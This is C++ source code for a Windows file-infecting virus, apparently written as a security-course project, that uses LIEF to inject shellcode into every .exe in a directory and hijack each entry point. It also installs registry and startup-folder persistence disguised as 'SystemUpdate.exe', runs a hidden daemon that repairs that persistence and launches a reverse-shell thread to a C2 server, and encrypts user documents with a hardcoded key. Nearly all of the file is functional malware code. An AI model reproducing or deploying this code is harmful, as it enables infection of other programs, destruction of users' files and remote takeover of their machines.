/**
 * LIEF PE Infector (C++) - Enhanced Version
 * 功能：
 * 1. 解析目标 PE 文件
 * 2. 新增一个 ".hacked" 节
 * 3. 写入 MessageBox Shellcode
 * 4. 计算 JMP 偏移，使执行完 Shellcode 后跳回原入口点 (OEP)
 * 5. 修改 EntryPoint 指向新节
 * 6. 文件加密功能
 * 7. 后台保活（持久化）
 * 8. 后台守护进程
 */
#include <iostream>
#include <vector>
#include <memory>
#include <string>
#include <thread>
#include <chrono>
#include <LIEF/LIEF.hpp>
#include "PEVirus.h"
#include "Utils/enc.h"
#include <Windows.h>
#include <shlobj.h>
#include "client/client.h"
using namespace LIEF::PE;

// ==========================================
// 全局变量
// ==========================================
static bool g_isRunning = true;
static HANDLE g_mutex = NULL;
static const char* MUTEX_NAME = "Global\\PEVirus_Mutex_npc0vo";
static const int CHECK_INTERVAL = 300; // 5 分钟检查一次

bool InstallPersistence();
// ==========================================
// 后台保活守护进程
// ==========================================

/**
 * 隐藏控制台窗口
 */
void HideConsoleWindow() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

/**
 * 创建互斥体防止重复运行
 * @return 如果已有实例运行返回 false
 */
bool CreateSingleInstanceMutex() {
    g_mutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "[!] Another instance is already running" << std::endl;
        return false;
    }
    std::cout << "[+] Single instance mutex created" << std::endl;
    return true;
}

/**
 * 检查持久化是否存在
 */
bool CheckPersistenceExists() {
    bool registryExists = false;
    bool startupExists = false;

    // 检查注册表
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[MAX_PATH];
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "SystemUpdate", NULL, NULL, 
                            (LPBYTE)value, &size) == ERROR_SUCCESS) {
            registryExists = true;
        }
        RegCloseKey(hKey);
    }

    // 检查启动目录
    char startupPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK) {
        std::string targetPath = std::string(startupPath) + "\\SystemUpdate.exe";
        if (GetFileAttributesA(targetPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            startupExists = true;
        }
    }

    return registryExists && startupExists;
}

/**
 * 修复持久化（如果被删除）
 */
bool RepairPersistence() {
    std::cout << "[*] Repairing persistence..." << std::endl;
    
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    bool repaired = false;

    // 修复注册表
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        
        std::string command = "\"" + std::string(currentPath) + "\" --silent --daemon";
        if (RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ,
                          (BYTE*)command.c_str(), command.length() + 1) == ERROR_SUCCESS) {
            std::cout << "[+] Registry entry repaired" << std::endl;
            repaired = true;
        }
        RegCloseKey(hKey);
    }

    // 修复启动目录
    char startupPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK) {
        std::string targetPath = std::string(startupPath) + "\\SystemUpdate.exe";
        if (GetFileAttributesA(targetPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            if (CopyFileA(currentPath, targetPath.c_str(), FALSE)) {
                std::cout << "[+] Startup file repaired" << std::endl;
                repaired = true;
            }
        }
    }

    return repaired;
}

/**
 * 守护线程 - 持续监控和保持运行
 */
void DaemonThread() {
    std::cout << "[*] Daemon thread started" << std::endl;

    int cycleCount = 0;
    while (g_isRunning) {
        cycleCount++;

        // 每个周期检查持久化状态
        if (!CheckPersistenceExists()) {
            std::cout << "[!] Persistence lost, attempting repair..." << std::endl;
            RepairPersistence();
        }

        // 每 10 个周期（50 分钟）执行一次自我复制,并尝试连接c2服务器
        if (cycleCount % 10 == 0) {
            char currentPath[MAX_PATH];
            GetModuleFileNameA(NULL, currentPath, MAX_PATH);
            
            // 复制到临时目录作为备份
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            std::string backupPath = std::string(tempPath) + "svchost_backup.exe";
            CopyFileA(currentPath, backupPath.c_str(), FALSE);
			std::cout << "[+] Backed up to: " << backupPath << std::endl;
            // 设置隐藏属性
            SetFileAttributesA(backupPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
			HANDLE hThread = NULL;
            //建立C2通信
            hThread = CreateThread(
                NULL,
                0,
                ReverseShellThread,
                NULL,
                0,
                NULL
            );

            if (hThread) {
                CloseHandle(hThread);  // 分离线程
            }
        }

        // 休眠 5 分钟
        for (int i = 0; i < CHECK_INTERVAL && g_isRunning; i++) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    std::cout << "[*] Daemon thread stopped" << std::endl;
}

/**
 * 启动后台保活守护进程
 * @param hideWindow 是否隐藏窗口
 * @return 成功返回 true
 */
bool StartBackgroundDaemon(bool hideWindow = true) {
    std::cout << "[*] Starting background daemon..." << std::endl;

    // 检查是否已有实例运行
    if (!CreateSingleInstanceMutex()) {
        return false;
    }

    // 隐藏窗口
    if (hideWindow) {
        HideConsoleWindow();
    }

    // 安装持久化（如果尚未安装）
    if (!CheckPersistenceExists()) {
        std::cout << "[*] Installing persistence..." << std::endl;
        InstallPersistence();
    }

    // 启动守护线程
    std::thread daemon(DaemonThread);
    daemon.detach();
    HANDLE hThread = NULL;



    std::cout << "[+] Background daemon started successfully" << std::endl;
    return true;
}

/**
 * 停止后台守护进程
 */
void StopBackgroundDaemon() {
    g_isRunning = false;
    
    if (g_mutex) {
        ReleaseMutex(g_mutex);
        CloseHandle(g_mutex);
        g_mutex = NULL;
    }
    
    std::cout << "[*] Background daemon stopped" << std::endl;
}

// ==========================================
// 持久化功能
// ==========================================

bool InstallPersistence() {
    std::cout << "[*] Installing persistence..." << std::endl;

    // 获取当前程序路径
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    // 复制到启动目录
    char startupPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) != S_OK) {
        std::cerr << "[-] Failed to get startup folder" << std::endl;
        return false;
    }

    std::string targetPath = std::string(startupPath) + "\\SystemUpdate.exe";
    if (!CopyFileA(currentPath, targetPath.c_str(), FALSE)) {
        std::cerr << "[-] Failed to copy to startup folder" << std::endl;
    } else {
        std::cout << "[+] Copied to startup: " << targetPath << std::endl;
    }

    // 添加到注册表
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        //防止污染系统
        std::string command = "\"" + std::string(currentPath) + "\" \"C:\\Users\\Administrator\\Desktop\\SoftSecExp\\PEVirus\\Tests\" --silent --daemon";
        //std::string command = "\"" + std::string(currentPath) + "\" --silent --daemon";
		std::cout << "[*] Registry command: " << command << std::endl;
        if (RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ,
                          (BYTE*)command.c_str(), command.length() + 1) == ERROR_SUCCESS) {
            std::cout << "[+] Added to registry startup" << std::endl;
        } else {
            std::cerr << "[-] Failed to add registry key" << std::endl;
        }
        RegCloseKey(hKey);
        return true;
    }

    return false;
}

// ==========================================
// 帮助信息
// ==========================================

void PrintHelp(const char* programName) {
    std::cout << "\n========================================\n";
    std::cout << "   PE Virus - Enhanced Edition\n";
    std::cout << "   Author: npc0vo\n";
    std::cout << "========================================\n\n";
    std::cout << "Usage:\n";
    std::cout << "  " << programName << " [options] [target]\n\n";
    std::cout << "Options:\n";
    std::cout << "  -h, --help              Show this help message\n";
    std::cout << "  -e, --encrypt           Encrypt files in target directory\n";
    std::cout << "  -p, --persist           Install persistence (run on startup)\n";
    std::cout << "  -d, --daemon            Start background daemon (keep alive)\n";
    std::cout << "  -s, --silent            Silent mode (no output)\n";
    std::cout << "  -t, --target <path>     Specify target file or directory\n\n";
    std::cout << "Examples:\n";
    std::cout << "  " << programName << "                    # Infect current directory\n";
    std::cout << "  " << programName << " -t victim.exe      # Infect single file\n";
    std::cout << "  " << programName << " -t C:\\test         # Infect directory\n";
    std::cout << "  " << programName << " -e -t C:\\docs     # Encrypt files in directory\n";
    std::cout << "  " << programName << " -p -d              # Install persistence + daemon\n";
    std::cout << "  " << programName << " --daemon           # Run as background daemon\n\n";
    std::cout << "Default Behavior (no arguments):\n";
    std::cout << "  - Infect all .exe files in current directory (except self)\n";
    std::cout << "  - Install persistence for background operation\n";
    std::cout << "  - Start background daemon\n\n";
    std::cout << "⚠️  For educational purposes only!\n";
    std::cout << "========================================\n\n";
}

// ==========================================
// PE感染函数
// ==========================================

bool isAlreadyInfected(Binary* binary) {
    for (const auto& section : binary->sections()) {
        if (section.name() == ".hacked") return true;
    }
    return false;
}

void InjectCode(const std::string& target_path, const std::string& output_path) {
    std::cout << "[*] Loading target: " << target_path << std::endl;

    // 1. 解析 PE
    std::unique_ptr<Binary> binary = Parser::parse(target_path);
    if (!binary) {
        std::cerr << "[-] Failed to parse binary." << std::endl;
        return;
    }
    //如果已经感染就跳过
    if (isAlreadyInfected(binary.get())) {
        std::cout << "[!] File already infected, skipping: " << target_path << std::endl;
        return;
    }
    // 2. 获取原始入口点 RVA
    uint32_t original_ep_rva = binary->optional_header().addressof_entrypoint();
#ifdef DEBUG
    std::cout << "[*] Original EntryPoint (RVA): 0x" << std::hex << original_ep_rva << std::endl;
#endif
    // 3. 构造 Payload
    std::vector<uint8_t> payload(std::begin(shellcode), std::end(shellcode));
#ifdef DEBUG
	std::cout << "payload size: " << payload.size() << " bytes" << std::endl;
#endif

    // 预留 JMP 指令空间 (5 bytes)
    uint32_t total_payload_size = static_cast<uint32_t>(payload.size()) + 5;
    
    // 按节对齐要求对齐大小
    uint32_t section_alignment = binary->optional_header().section_alignment();
    uint32_t aligned_size = ((total_payload_size + section_alignment - 1) / section_alignment) * section_alignment;

    // 4. 准备新节并设置大小
    Section new_section(".hacked");
    new_section.characteristics(0xE0000020);
    
    // 显式设置节的虚拟大小和原始大小
    new_section.virtual_size(aligned_size);
    new_section.sizeof_raw_data(aligned_size);
    
    // 预分配空间
    std::vector<uint8_t> section_content(aligned_size, 0x00);
    new_section.content(section_content);

    // 5. 添加节
    Section* added_section = binary->add_section(new_section);
#ifdef DEBUG
    std::cout << "[*] New Section Added. Virtual Address: 0x" << std::hex << added_section->virtual_address() << std::endl;
#endif

    // 6. 计算 JMP 指令
    uint32_t shellcode_size = static_cast<uint32_t>(payload.size());
    uint32_t new_section_rva = static_cast<uint32_t>(added_section->virtual_address());
    uint32_t jmp_instruction_rva = new_section_rva + shellcode_size;
    uint32_t next_instruction_rva = jmp_instruction_rva + 5;
    int32_t relative_offset = static_cast<int32_t>(original_ep_rva - next_instruction_rva);
#ifdef DEBUG
    std::cout << "[*] Shellcode ends at RVA: 0x" << std::hex << jmp_instruction_rva << std::endl;
    std::cout << "[*] JMP instruction at RVA: 0x" << std::hex << jmp_instruction_rva << std::endl;
    std::cout << "[*] Next instruction at RVA: 0x" << std::hex << next_instruction_rva << std::endl;
    std::cout << "[*] Jumping back to OEP: 0x" << std::hex << original_ep_rva << std::endl;
    std::cout << "[*] Relative offset: 0x" << std::hex << relative_offset << std::endl;
#endif
    // 追加 JMP 指令到 payload（跳回原入口点）
    payload.push_back(0xE9);  // JMP rel32
    payload.push_back(relative_offset & 0xFF);
    payload.push_back((relative_offset >> 8) & 0xFF);
    payload.push_back((relative_offset >> 16) & 0xFF);
    payload.push_back((relative_offset >> 24) & 0xFF);
    // 7. 更新节内容
    std::vector<uint8_t> final_content(aligned_size, 0x00);
    std::copy(payload.begin(), payload.end(), final_content.begin());
    added_section->content(final_content);

    // 8. 修改 EntryPoint
	binary->optional_header().addressof_entrypoint(new_section_rva + 0xcd); // adjust for shellcode start

	// 9. 写出感染后的二进制文件
    binary->write(output_path);
    std::cout << "[+] Infection Successful!" << std::endl;
}

// ==========================================
// 目录感染（保持不变）
// ==========================================

void InfectDirectory(const std::string& targetPath, bool excludeSelf = true) {
    std::cout << "[*] 正在扫描目录: " << targetPath << std::endl;

    // 获取当前程序名（用于排除自身）
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::string selfName = std::string(selfPath);
    size_t lastSlash = selfName.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        selfName = selfName.substr(lastSlash + 1);
    }

    // 构造搜索通配符
    std::string searchPath = targetPath + "\\*.exe";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] 目录下未找到 .exe 文件。" << std::endl;
        return;
    }

    int infectedCount = 0;
    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::string fileName = findData.cFileName;
            
            // 排除自身
            if (excludeSelf && fileName == selfName) {
                std::cout << "[!] Skipping self: " << fileName << std::endl;
                continue;
            }

            std::cout << "[*] 正在感染: " << fileName << std::endl;
            std::string fullPath = targetPath + "\\" + fileName;
            InjectCode(fullPath, fullPath);
            infectedCount++;
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
    std::cout << "[+] Total files infected: " << infectedCount << std::endl;
}

// ==========================================
// 主函数 - 新的参数解析
// ==========================================

int main(int argc, char** argv) {
    bool enableEncrypt = false;
    bool enablePersist = false;
    bool enableDaemon = false;
    bool silentMode = false;
    std::string targetPath = "";

    // 默认行为：无参数时感染当前目录、安装持久化、启动守护进程
    if (argc == 1) {
        std::cout << "[*] No arguments provided, using default behavior:\n";
        std::cout << "    - Infecting current directory (excluding self)\n";
        std::cout << "    - Installing persistence\n";
        std::cout << "    - Starting background daemon\n\n";

        // 获取当前目录
        char currentDir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, currentDir);
        targetPath = std::string(currentDir);

        // 感染当前目录
        InfectDirectory(targetPath, true);

        // 安装持久化
        InstallPersistence();

        // 启动后台守护进程
        StartBackgroundDaemon(true); // 不隐藏窗口（for DEBUG）

        std::cout << "\n[+] Default operation completed!\n";
        std::cout << "[*] Press Ctrl+C to stop daemon...\n";
        
        // 保持运行
        while (g_isRunning) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        
        return 0;
    }

    // 解析命令行参数
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];

        if (arg == "-h" || arg == "--help") {
            PrintHelp(argv[0]);
            return 0;
        }
        else if (arg == "-e" || arg == "--encrypt") {
            enableEncrypt = true;
        }
        else if (arg == "-p" || arg == "--persist") {
            enablePersist = true;
        }
        else if (arg == "-d" || arg == "--daemon") {
            enableDaemon = true;
        }
        else if (arg == "-s" || arg == "--silent") {
            silentMode = true;
        }
        else if (arg == "-t" || arg == "--target") {
            if (i + 1 < argc) {
                targetPath = argv[++i];
            } else {
                std::cerr << "[-] Error: --target requires a path\n";
                return 1;
            }
        }
        else {
            // 假设是目标路径（向后兼容）
            targetPath = arg;
        }
    }

    // 静默模式：重定向输出
    if (silentMode) {
        freopen("NUL", "w", stdout);
        freopen("NUL", "w", stderr);
    }

    // 如果启用守护进程模式
    if (enableDaemon) {
        std::cout << "[*] Daemon mode enabled\n";
        
        // 启动守护进程
        if (StartBackgroundDaemon(silentMode)) {
            // 保持运行
            while (g_isRunning) {
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
        }
        return 0;
    }

    // 如果没有指定目标，使用当前目录
    if (targetPath.empty()) {
        char currentDir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, currentDir);
        targetPath = std::string(currentDir);
    }

    // 执行持久化
    if (enablePersist) {
        InstallPersistence();
    }

    // 获取文件/目录属性
    DWORD dwAttrib = GetFileAttributesA(targetPath.c_str());
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        std::cerr << "[-] 路径不存在: " << targetPath << std::endl;
        return 1;
    }

    // 执行加密
    if (enableEncrypt) {
        std::cout << "[*] Encryption mode enabled\n";
        
        if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
            // 加密目录下的文件
            std::vector<std::string> extensions = {
                ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx",
                ".ppt", ".pptx", ".jpg", ".png", ".zip", ".rar"
            };
            
            int count = SimpleEncryptor::EncryptDirectory(targetPath, extensions, "PEVirus2024");
            std::cout << "[+] Encrypted " << count << " files\n";
        } else {
            // 加密单个文件
            if (SimpleEncryptor::EncryptFile(targetPath, "PEVirus2024")) {
                std::cout << "[+] File encrypted successfully\n";
            }
        }
    }
    // 执行感染
    else {
        if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
            // 目录感染模式
            InfectDirectory(targetPath, true);
        }
        else {
            // 单文件感染模式
            InjectCode(targetPath, targetPath);
        }
    }

    return 0;
}